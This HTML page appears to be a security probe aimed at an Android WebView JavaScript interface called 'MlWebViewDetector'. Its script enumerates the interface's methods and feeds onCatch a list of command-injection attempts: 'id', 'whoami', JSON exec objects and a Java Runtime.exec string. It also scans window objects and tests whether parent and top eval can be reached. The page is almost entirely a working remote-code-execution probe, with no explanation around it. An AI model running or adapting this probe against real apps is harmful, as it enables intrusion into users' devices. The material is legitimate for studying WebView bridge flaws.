<!DOCTYPE html>
<html>
<head>
    <title>Test MlWebViewDetector</title>
    <style>
        body { font-family: monospace; background: black; color: lime; padding: 20px; }
        .success { color: #0f0; }
        .testing { color: #ff0; }
    </style>
</head>
<body>
    <h2>🔍 Testing MlWebViewDetector Interface</h2>
    <div id="output"></div>
    
    <script>
        var out = document.getElementById('output');
        
        if(window.MlWebViewDetector) {
            out.innerHTML += '✅ <b>MlWebViewDetector FOUND!</b><br>';
            out.innerHTML += 'Type: ' + typeof window.MlWebViewDetector + '<br>';
            
            // List all methods
            var methods = Object.getOwnPropertyNames(window.MlWebViewDetector);
            out.innerHTML += 'Methods: ' + methods.join(', ') + '<br><br>';
            
            // Try the onCatch method you saw
            if(window.MlWebViewDetector.onCatch) {
                out.innerHTML += '<span class="testing">Testing onCatch method...</span><br>';
                
                // Try different calls
                var testCalls = [
                    'id',
                    'whoami',
                    '{"command":"id"}',
                    '{"action":"exec","cmd":"id"}',
                    'exec:id',
                    'Runtime.getRuntime().exec("id")'
                ];
                
                testCalls.forEach((call, i) => {
                    setTimeout(() => {
                        try {
                            out.innerHTML += 'Trying: ' + call + ' → ';
                            var result = window.MlWebViewDetector.onCatch(call);
                            if(result !== undefined) {
                                out.innerHTML += '<span class="success">' + result + '</span><br>';
                            } else {
                                out.innerHTML += 'no response<br>';
                            }
                        } catch(e) {
                            out.innerHTML += 'error: ' + e.message + '<br>';
                        }
                    }, i * 500);
                });
            }
            
            // Also check if MlWebViewDetector is a function itself
            if(typeof window.MlWebViewDetector === 'function') {
                out.innerHTML += '<br><span class="testing">MlWebViewDetector is a function, calling it...</span><br>';
                try {
                    var result = window.MlWebViewDetector('test');
                    out.innerHTML += 'Result: ' + result + '<br>';
                } catch(e) {
                    out.innerHTML += 'Error: ' + e.message + '<br>';
                }
            }
            
        } else {
            out.innerHTML += '❌ MlWebViewDetector not found<br>';
            
            // Check for other suspicious objects
            out.innerHTML += '<br>🔍 Looking for other custom objects...<br>';
            var customObjects = [];
            for(var key in window) {
                // Skip standard objects
                if(key.length > 5 && !key.startsWith('HTML') && !key.startsWith('XML') && 
                   key !== 'document' && key !== 'window' && key !== 'navigator' &&
                   key !== 'location' && key !== 'console') {
                    customObjects.push(key);
                }
            }
            
            if(customObjects.length > 0) {
                out.innerHTML += 'Found: ' + customObjects.join(', ') + '<br>';
            }
        }
        
        // Also test if we can call eval (you had this earlier)
        setTimeout(() => {
            out.innerHTML += '<br><hr><h3>🚀 Testing eval access</h3>';
            try {
                out.innerHTML += 'parent.eval exists: ' + (typeof parent.eval) + '<br>';
                out.innerHTML += 'top.eval exists: ' + (typeof top.eval) + '<br>';
                out.innerHTML += 'window.eval exists: ' + (typeof window.eval) + '<br>';
                
                // Try a simple eval
                if(typeof parent.eval === 'function') {
                    out.innerHTML += '<span class="testing">Trying parent.eval("alert(1)")...</span><br>';
                    // parent.eval('alert("Test from eval")');
                }
            } catch(e) {
                out.innerHTML += 'Eval error: ' + e.message + '<br>';
            }
        }, 3000);
    </script>
</body>
</html>
